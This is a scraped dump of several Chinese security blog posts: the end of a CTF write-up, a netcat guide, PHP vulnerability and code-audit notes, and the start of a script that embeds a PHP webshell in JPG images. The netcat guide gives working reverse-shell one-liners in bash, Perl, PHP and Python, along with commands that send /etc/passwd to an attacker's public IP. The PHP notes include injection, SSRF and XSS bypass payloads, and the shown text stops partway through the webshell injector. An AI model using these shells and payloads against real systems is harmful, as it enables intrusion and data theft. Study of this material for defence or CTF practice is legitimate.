得到新的eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzczMzcyNTcsImV4cCI6MTUzNzMzNzg1N30.LVpR0h6soIt3A3IRqis-T1nywLn_D_taJQhFTZdw9SE 重新发送 flag:flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods} https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#babycrypto-50-crypto","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"netcat食用指南","slug":"Netcat","date":"2018-10-04T05:34:13.000Z","updated":"2018-10-04T07:22:07.318Z","comments":true,"path":"2018/10/04/Netcat/","link":"","permalink":"https://threst.github.io/2018/10/04/Netcat/","excerpt":"","text":"阿里云ecs:47.106.230.228目标机kali:校园网 可以输入nc -h查看帮助：123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)-o film记录16进制的传输-p[空格]端口 本地端口号-s addr 本地源地址-r 随机本地及远程端口-t 使用Telnet交互方式-u UDP模式-v 详细输出，用-vv将更详细-w 数字 timeout延时间隔-z 将输入，输出关掉（用于扫锚时） PortScan(端口扫描)基本tcp扫描：nc -vv 47.106.230.228 6666例：nc -vv 47.106.230.228 6666扫描47.106.230.228 的tcp 6666端口 设置延时，指定端口扫描：12nc -vv -w secs ip port-port例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。 聊天客户端(主动)nc ip port 服务端(坐等连)nc -lvp port 发文件主要看&lt;&gt;符号的尖的方向，表示将文件流到其方向 发送端nc -v -w 20 -p 6666 -l &lt; aaa.txt -w 20表示发送前后都等待20秒,根据箭头表示将文件发送到nc中 接收端nc -v -w 2 47.106.230.228 端口 &gt;bbb.txt由于我们是接受端，所以时间不用太久,箭头方向表示将nc接收来的文件保存起来 总的来看就是这样aaa.txt --&gt; nc --&gt; bbb.txt 目标机上下载文件攻击机nc -l -p 6666 &gt; kali.txt目标机nc 47.106.230.228 6666 &lt; /etc/passwd这样就将本地kali的文件发给攻击者了 上传文件至目标机攻击机nc -l -p 6666 &lt; /etc/passwd目标机nc 47.106.230.228 6666 &gt; ecs.txt将攻击机中passwd下载至本地ecs.txt,关于&lt;&gt;的用法和上面介绍的一样 加密传输的数据服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt客户端：$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567 命令记录nc -vv victim_ip port &lt; path\\file.cmd 搭建蜜罐 nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 nc -L -p 80 &gt; c:\\log.txt作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt*nc -L -p 80 &lt; c:\\honeyport.txt作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 type.exe c:\\honeyport | nc -L -p 80作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 作为蜜罐使用1： 命令：nc -L -p Port 注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止 作为蜜罐使用2： 命令：nc -L -p Port &gt;log.txt 注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止，同时把结果输出到log.txt文件中，如果把“&gt;”改为“&gt;&gt;”即追加到文件之后。 这一个命令参数“-L”在Windows中有，现在的Linux中是没有这个选项的，但是自己可以去找找，这里只是想到了之前的这个使用，所以提出来简单介绍一下！ shell正向shell(没有公网ip的主机发起对目标主机的远程连接)公网服务器:47.106.230.228校园网kali 服务器nc -lvp 6666 -t -e /bin/bash 目标主机(可以执行命令)nc 47.106.230.228 6666 反向shell –e选项发送回一个BashShell的攻击。请注意，我们还可以使用cmd.exe的–e选项的窗口 netcat监听者nc -lvp 6666目标主机nc 47.106.230.228 6666 -e /bin/bash对于Windows：nc 47.106.230.228 6666 -e cmd.exe 目标主机中没有nc上面的情况是目标主机中有nc，如果没有怎么办呢?攻击照常监听nc -lvp 6666目标主机bash -i&gt;&amp; /dev/tcp/47.106.230.228/6666 0&gt;&amp;1 注意空格 使用Perl攻击照常监听nc -lvp 6666 目标主机1perl -e 'use Socket;$i=\"47.106.230.228\";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' PHP shell攻击照常监听nc -lvp 6666 目标主机1php -r '$sock=fsockopen(\"47.106.230.228\",6666);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' Python shell攻击照常监听nc -lvp 6666 目标主机1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.106.230.228\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 流量转发 从nc升级到msf简单攻击机1234use exploit/multi/handlerset payload linux/x64/shell/reverse_tcpset lhost 47.106.230.228(ecs本机ip)set lport 6666 目标主机nc 47.106.230.228 6666 -e /bin/bash 成功获取回话 资料:https://www.anquanke.com/post/id/87017","categories":[],"tags":[{"name":"netcat","slug":"netcat","permalink":"https://threst.github.io/tags/netcat/"}]},{"title":"php安全","slug":"php安全","date":"2018-10-04T05:34:12.000Z","updated":"2018-10-04T07:21:47.693Z","comments":true,"path":"2018/10/04/php安全/","link":"","permalink":"https://threst.github.io/2018/10/04/php安全/","excerpt":"","text":"0x01 PHP敏感配置项register_globals(php版本小于5.4时存在)当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题； (PS:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源) allow_url_include(php版本大于5.2默认为off)当该配置项为ON时，可以通过include、require等函数进行远程文件包含 其中有个类似的配置项是allow_url_fopen，这个参数配置为on的时候可以函数中例如file_get_contents中打开url。 当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含 magic_quato_gpc（php版本小于5.4存在）此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（）、空字符(NULL)前添加反斜杠进行转义，注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞 magic_quato_runtime（php版本小于5.4存在）这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响 magic_quato_sybase（php版本小于5.4存在）这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置 open_basedir这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/ 0x02 PHP常见敏感函数注入: select from,mysql_connect,mysql_query,mysql_fetch_*,update,insert,delete 宽字节注入: set names gbk、character_set_client=gbk mysql_set_charset(&apos;gbk&apos;),iconv 二次编码注入: urldecode,rawurldecode 文件包含 : include,include_once 、require、require_once 文件上传 : move_upload_file 任意文件删除 : unlink、session_destory 代码注入 : eval assert,preg_replace(/e),call_user_func,call_user_func_array,array_map等 命令执行: system、exec、shell_exec、passthru 、pctnl_exec、popen、proc_exec、 变量覆盖: extract、parse_str、$$ 反序列化: unserialize 随机数: rand、mt_rand 0x03 常见漏洞解析各种问题可以导致系统重装一般程序都是通过判断install文件下有没有安装过程中生成的以lock为后缀的文件或者config配置文件来判断有没有安装。 1.未对系统是否已经安装进行判断例如PHPSHE B2C商城1.6（wooyun 2014-062047）可以看到代码未对是否安装进行任何判断，直接进入安装流程 2.变量覆盖绕过例如frcms (wooyun 2014-073244)其中主要的漏洞代码是 foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request){ foreach($$_request as $_k =&gt; $_v) ${$_k} = _runmagicquotes($_v); } 他会把你从GET、POST、COOKIE中的变量注册为全局变量，因此我们直接通过GET参数提交$insLockfile变量即可绕过 3.判断已安装后未exit()退出程序例如startbbs （wooyun-2013-045143） class Install extends Install_Controller { function __construct () { parent::__construct(); $this-&gt;load-&gt;library(&apos;myclass&apos;); $file=FCPATH.&apos;install.lock&apos;; if (file_exists($file)){ $this-&gt;myclass-&gt;notice(&apos;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&apos;.site_url().&apos;&quot;;&apos;); } } 可以看到其中判断install.lock文件存在后直接使用js代码将用户进行重定向，但是并没有die程序，直接从前端删除返回的js代码即可重装 4.还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS:这个就留在任意文件删除再分析）例如: 用thinkphp 改造的hdcms （wooyun-2015-092061）我们先跟着框架走一遍，首先查看入口文件index.php 首先定义了一些基本的框架目录，然后就直接开始引入框架文件，我们进入框架初始化文件hdphp.php 前面还是检测一次是否成功初始化常量，然后检测是否进行过编译，否则就载入文件进行首次编译，然后进行boot的run方法，查看该方法内容。 前面依然是定义了各种常量，我们可以直接跳过，来到最后的应用初始化，查看该方法 可以看到module_path常量是通过将get形式提交的var_group参数进行拼接的，然后又将module_path拼接入module_config_path，最后使用require进行了文件包含。（PS:因为这里后面制定了config.php，所以需要用到%00进行截断） 但是我们分析到目前为止只能说是疑似存在文件包含漏洞，我们还要看GET参数接收时有没有进行过滤，于是我们进入之前的解析路由方法route::parseurl()，代码较长我就不贴图了，里面就是将url中的参数进行截取解析，没有进行任何的过滤和检测，因此可以确定此处存在文件包含漏洞。因此我们接下来需要确定输入点，可以发现变量是通过thinkphp中获取参数的C方法进行获取的，而C方法获取的变量在config.php中，于是我们查看文件中可以看到var_group对应的变量是g 因此我们可以先上传一个文件然后index.php?g=../test.php%00 之前的文件包含漏洞我们是通过index.php这个入口文件一步步搞懂cms框架然后进行审计。除了这种方法，我们还可以直接定位数据库查询语句或者功能附近，看看传入的数据有没有被进行清洗。 注入漏洞这里我们就用两个有意思的骚操作来分析一下 1.Ecshop 支付宝插件全局转义绕过导致sql注入其实在ECshop中的init.php中对用户输入的参数进行了全局转义 但是我们来到来到案发现场看看，巧妙的运用str_replace的替换功能来帮助单引号进行逃逸 其中的核心漏洞代码是$order_sn = str_replace($_GET[‘subject’], ‘’, $_GET[‘out_trade_no’]);其中代码对用户提交的out_trade_no参数中将subject替换为空，然后送入check_money函数中的sql查询语句.这个漏洞的关键在于str_replace函数中的替换内容和源字符串都是可控的。理解这个漏洞之前我们再来回顾一下php中addslashes中的转义处理机制[--&gt;\\,”–&gt;\\”,”–&gt;\\”,null–&gt;\\0]于是我们可以提交out_trade_no参数为%00’后面再跟上我们的payload，提交的subject参数为0，我们来看一下数据转换过程.out_trade_no=%00’ ————&gt;经过全局gpc转义————&gt; out_trade_no=\\0\\’————&gt;送入str_replace函数处理，将0替换————&gt;out_trade_no=\\‘ 也就是等于了’，最终也就成功在sql语句中引入了一个单引号，从而可以进行注入 2.格式化字符串导致的单引号逃逸再来分析一下前段时间出来的wordpress格式化字符导致的注入 具体的代码分析在这就不贴图了，我们直接来分析一下格式化字符串漏洞的核心原理，其中一个关键点就是sprintf的padding特性 printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能 例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉 斜杠） 同时sprintf（）可以使用指定参数位置的写法 %后面的数字代表第几个参数，$后代表格式化类型 于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时,例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了 还有一种情况就是’被转义成了’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\\’于是sql语句变成了select * from user where username = ‘%\\’ and 1=1#’;如果这个语句被使用sprintf函数进行了拼接，%后的被吃掉了，导致了’逃逸 &lt;?php $sql = &quot;select * from user where username = &apos;%\\&apos; and 1=1#&apos;;&quot;; $args = &quot;admin&quot;; echo sprintf( $sql, $args ) ; //result: select * from user where username = &apos;&apos; and 1=1#&apos; ?&gt; 不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错这个时候我们可以使用%1$来吃掉转移添加的\\ &lt;?php $sql = &quot;select * from user where username = &apos;%1$\\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;; $args = &quot;admin&quot;; echo sprintf( $sql, $args) ; //result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;; ?&gt; 0x03 php安全strcmp 弱类型比较特性strcmp是C与PHP中常用的一个函数，用来比较两个字符串是否相等。如果二者相等，则返回数字0，否则返回其他数字。 strcmp函数当我们传入一个数组和一个字符串时，将会触发一个警告，函数返回FALSE。由于PHP弱类型的特性，FASLE == 0，会让系统误认为返回的值是0，最后绕过strcmp函数的判断。 Linux PHP 写入与删除文件差异特性有时候目标网站存在任意文件上传漏洞，但操作执行完成后即刻删除，导致我们的webshell无法保留在服务器上。这种情况多存在于一些有缓存文件、临时文件的逻辑中，在实战里经常遇到。 Linux下，php的文件写入与移动删除等操作中，由于对于路径的处理存在差异，在有上述情况存在时，我们可以通过传入文件名为shell.php/.的文件，绕过删除函数。 preg_replace 利用 \\0 截断执行代码有些情况下，我们可控preg_replace的第一个参数（正则表达式）中的部分内容。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。 利用php filter流绕过死亡exit很多开发者在写入缓存、日志、配置文件的时候，通过在文件开头增加&lt;?php exit; ?&gt;。此时，即使用户控制文件内容，也无法执行。 我们可以利用PHP的filter流，通过php://filter/write=string.strip_tags|convert.base64-decode/resource=config.php来写入文件。 此时，PHP会先用strip_tags去除死亡exit，再将webshell用base64-decode还原，最终写入的文件中不再有死亡exit。 filter_var FILTER_VALIDATE_EMAIL 绕过filter_var是一组PHP中过滤、检测用户输入的方法，其中开发者通常利用filter_var($email, FILTER_VALIDATE_EMAIL)来过滤用户输入的邮箱。 RFC 3696规定邮箱local part部分可以用双引号包裹，双引号内即可填入任意字符。 我们可以利用RFC 3696，传入”aaa’aaa”@example.com，即可保留单引号，并通过filter_var的检测，最终触发SQL注入漏洞。 控制Nginx虚拟主机的Host在同一服务器上运行多个网站，Nginx会根据HTTP数据包中的Host头来区分用户访问的是哪个网站。我们如果修改Host头的值，将不能进入指定的网站。 此时，我们可以借助Nginx特性，用如下两个方法在$_SERVER[‘HTTP_HOST’]中注入恶意代码： 1. 在存在两个Host头时，Nginx取到的是第1个，PHP中取到的是第2个。我们将恶意代码放在第2个位置，将可控制$_SERVER[‘HTTP_HOST’] 2. Nginx在处理Host时，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，将恶意代码放在port位置，即可部分控制$_SERVER[‘HTTP_HOST’] 利用GBK编码吃反引号在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\\）等将被用一个转义符（\\）进行转义，导致我们无法闭合单引号进行注入。 在GBK编码的程序中，部分开发者会用iconv将字符串转换编码后存入数据库。在这种情况下，我们可以利用GBK编码中的0xE55C，转义正常的反斜线，绕过全局GPC进行注入。 iconv()绕过上传白名单在上传文件的过程中，如果目标使用的字符编码和访客操作系统使用的字符编码不同，可能导致上传后的文件名出现乱码。所以，开发者在获取文件名后，通常调用iconv()对其进行编码转换。 如果转换编码的操作在验证文件名后缀操作之后，那么我们可以利用iconv()特性，截断文件名，进而去除白名单中的后缀，造成文件上传漏洞。 PHP mt_rand() 随机数预测mt_rand()生成随机数有如下特点： 1. PHP &gt; 4.2.0中，系统会自动设置随机数种子，相同种子生成的随机数相同 2. 同一进程中，如果多次调用mt_rand()函数，只会自动播种一次 所以，如果同一次我们生成了数个随机数，在知道其中一部分的情况下，即可反推随机数种子。 32位系统中，种子最大值为2^16-1，64位系统中，种子最大值为2^31-1。我们爆破到该种子，即可预测其他未知的随机数。https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg PHP5 rand() 随机数预测PHP5 rand()函数使用了glibc库中的rand()函数，glibc中维护了一个随机数链，其上下文中存在如下关系： state[i] = state[i-3] + state[i-31] return state[i] &gt;&gt; 1 进而导致PHP5中的rand()函数生成的随机数也存在上述关系。如果开发者使用rand()函数生成密钥、salt等安全相关元素，将导致被预测。 利用json_encode吃转义符在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\\）等将被用一个转义符（\\）进行转义，导致我们无法闭合单引号进行注入。 部分开发者会将一些结构复杂内容（如数组）用json_encode编码成一个字符串后存入数据库，在这种情况下，我们可以绕过全局GPC进行注入 file_put_contents写入文件绕过内容黑名单在开发者使用file_put_contents写入文件的时候，有的情况下会用字符串匹配的方式拦截如“&lt;”、”&gt;”、”?”等字符，导致我们无法写入webshell。 file_put_contents函数第二个参数支持传入数组，用户传入的数组将被拼接成一个字符串写入文件。数组因为类型不同导致无法使用字符串匹配来检测，进而利用这种方式绕过了黑名单。 PHP MD5 比较的陷阱PHP是一门弱类型语言，在使用“==”进行变量比较的时候，会先进行类型转换，再进行比较操作。即使比较的是两个字符串，如果二者满足“科学计数法”的表达方法，也会先转换成数字再进行比较。 比如： var_dump(“0e1234” == “0e5678”); 其返回结果是true。 在比较md5时，如果目标密码的md5值恰好是“0e”+数字，将可以出现密码绕过漏洞。 PHP 5.6.11 数组比较BugPHP 5.6.11/5.5.27/5.4.44以前的版本中，存在一处数组比较的Bug（Bug #69892），我们可以通过 var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); 来复现该特性。 0x04 代码审计关注点）file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过&lt;?php $filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;]; $data = $user[&apos;info&apos;]; file_put_contents($filename, $data); if (file_exists($filename)) { unlink($filename); } ?&gt; 查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。 于是乎linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除,此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除 extract()、parse_str() 等变量覆盖extract函数从数组导入变量（如\\$_GET、 \\$_POST）,将数组的键名作为变量的值。而parse_str函数则是从类似name=Bill&amp;age=60的格式字符串解析变量.如果在使用第一个函数没有设置EXTR_SKIP或者EXTR_PREFIX_SAME等处理变量冲突的参数时、第二个函数没有使用数组接受变量时将会导致变量覆盖的问题 intval()整数溢出、向下取整和整形判断的问题32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807 ​ 因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647 此外intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入 intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\\0）时结束转换 浮点数精度问题导致的大小比较问题当小数小于10^-16后，PHP对于小数就大小不分了var_dump(1.000000000000000 == 1) &gt;&gt; TRUEvar_dump(1.0000000000000001 == 1) &gt;&gt; TRUE is_numeric()与intval()特性差异is_numeric函数在判断是否是数字时会忽略字符串开头的’ ‘、’\\t’、’\\n’、’\\r’、’\\v’、’\\f’。 ​ 而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\\r\\n\\t 0.1e2”) &gt;&gt; TRUE intval()函数会忽略’’ ‘\\n’、’\\r’、’\\t’、’\\v’、’\\0’ ，也就是说intval(“\\r\\n\\t 12”) &gt;&gt; 12 strcmp()数组比较绕过int strcmp ( string $ str1 , string \\$str2 ) 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 但是如果传入的两个变量是数组的话，函数会报错返回NULL，如果只是用strcmp()==0来判断的话就可以绕过 sha1()、md5() 函数传入数组比较绕过sha1（） MD5（）函数默认接收的参数是字符串类型，但是如果如果传入的参数是数组的话，函数就会报错返回NULL。类似sha1(\\$_GET[‘name’]) === sha1(\\$_GET[‘password’])的比较就可以绕过 弱类型==比较绕过这方面问题普及的很多，不作过多的解释 md5(‘240610708’); // 0e462097431906509019562988736854 md5(‘QNKCDZO’); // 0e830400451993494058024219903391 md5(‘240610708’) == md5(‘QNKCDZO’) md5(‘aabg7XSs’) == md5(‘aabC9RqS’) sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’) sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’) ‘0010e2’ == ‘1e3’ ‘0x1234Ab’ == ‘1193131‘ ‘0xABCdef’ == ‘ 0xABCdef’ 当转换为boolean时，以下只被认为是FALSE：FALSE、0、0.0、“”、“0”、array()、NULL PHP 7 以前的版本里，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略。var_dump(0123)=var_dump(01239)=83 PHP 7 以后，会产生 Parse Error。 字符串转换为数值时，若字符串开头有数字，则转为数字并省略后面的非数字字符。若一开头没有数字则转换为0 \\$foo = 1 + “bob-1.3e3”; // $foo is integer (1) \\$foo = 1 + “bob3”; // $foo is integer (1) \\$foo = 1 + “10 Small Pigs”; // $foo is integer (11) ‘’ == 0 == false ‘123’ == 123 ‘abc’ == 0 ‘123a’ == 123 ‘0x01’ == 1 ‘0e123456789’ == ‘0e987654321’ [false] == [0] == [NULL] == [‘’] NULL == false == 0» true == 1 eregi()匹配绕过eregi（）默认接收字符串参数，如果传入数组，函数会报错并返回NULL。同时还可以%00 截断进行绕过 PHP变量名不能带有点[.] 和空格，否则在会被转化为下划线[_]parse_str(&quot;na.me=admin&amp;pass wd=123&quot;,$test); var_dump($test); array(2) { [&quot;na_me&quot;]=&gt; string(5) &quot;admin&quot; [&quot;pass_wd&quot;]=&gt; string(3) &quot;123&quot; } PS：通过$_SERVER[‘REQUEST_URI’]方式获得的参数不会进行转换 \\$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果php在遇到相同参数时接受的是第二个参数in_arrary()函数默认进行松散比较（进行类型转换） in_arrary(“1asd”,arrart(1,2,3,4)) =&gt; true in_arrary(“1asd”,arrart(1,2,3,4),TRUE) =&gt; false \\\\(需要设置strict参数为true才会进行严格比较，进行类型检测) htmlspecialchars()函数默认只转义双引号不转义单引号，如果都转义的话需要添加上参数ENT_QUOTES在php4、php&lt;5.2.1中，变量的key值不受magic_quotes_gpc影响sprintf()格式化漏洞（可以吃掉转义后的单引号）printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉\\ 斜杠）同时sprintf（）可以使用指定参数位置的写法 &lt;?php $format = &apos;This %2$s contains %1$04d monkeys&apos;; echo sprintf($format,$num,$location); ?&gt; 以上实例会输出: The tree contains 0005 monkeys %后面的数字代表第几个参数，$后代表格式化类型于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了还有一种情况就是’被转义成了\\’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\\’于是sql语句变成了 select * from user where username = ‘%\\’ and 1=1#’;如果这个语句被使用sprintf函数进行了拼接，%后的\\被吃掉了，导致了’逃逸 &lt;?php $sql = &quot;select * from user where username = &apos;%\\&apos; and 1=1#&apos;;&quot;; $args = &quot;admin&quot;; echo sprintf( $sql, $args ) ; //result: select * from user where username = &apos;&apos; and 1=1#&apos; ?&gt; 不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错这个时候我们可以使用%1$来吃掉转移添加的\\ &lt;?php $sql = &quot;select * from user where username = &apos;%1$\\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;; $args = &quot;admin&quot;; echo sprintf( $sql, $args) ; //result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;; ?&gt; php中 = 赋值运算的优先级高于and$c = is_numeric($a) and is_numeric($b) 程序本意是要a、b都为数字才会继续，但是当\\$a为数字时，会先赋值给\\$c，所以可能导致$b绕过检测 parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对http://user@eval.com:80@baidu.com 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过 此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是`evil@baidu.com`，但是libcurl获取的host却是evil.com url标准的灵活性导致绕过filter_var与parse_url进行ssrffilter_var()函数对于http://evil.com;google.com 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\\google.com:80/却返回true。 通过file_get_contents获取网页内容并返回到客户端有可能造成xss例如如下代码 if(filter_var($argv[1], FILTER_VALIDATE_URL)) { // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\\.com$/&apos;, $r[&apos;host&apos;])) { // get page from URL $a = file_get_contents($argv[1]); echo($a); } else { echo &quot;Error: Host not allowed&quot;; } } else { echo &quot;Error: Invalid URL&quot;; } 虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定但是可以通过data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=页面会将&lt;script&gt;alert(1)&lt;/script&gt;返回给客户端，就有可能造成xss 序列化漏洞常见的魔法函数construct():当一个类被创建时自动调用destruct():当一个类被销毁时自动调用invoke():当把一个类当作函数使用时自动调用tostring():当把一个类当作字符串使用时自动调用wakeup():当调用unserialize()函数时自动调用sleep():当调用serialize()函数时自动调用__call():当要调用的方法不存在或权限不足时自动调用","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://threst.github.io/tags/php/"}]},{"title":"phpgd绕过","slug":"phpgd绕过","date":"2018-10-04T05:34:11.000Z","updated":"2018-10-04T07:05:11.076Z","comments":true,"path":"2018/10/04/phpgd绕过/","link":"","permalink":"https://threst.github.io/2018/10/04/phpgd绕过/","excerpt":"","text":"源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = '&lt;?=system($_GET[c]);?&gt;'; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); 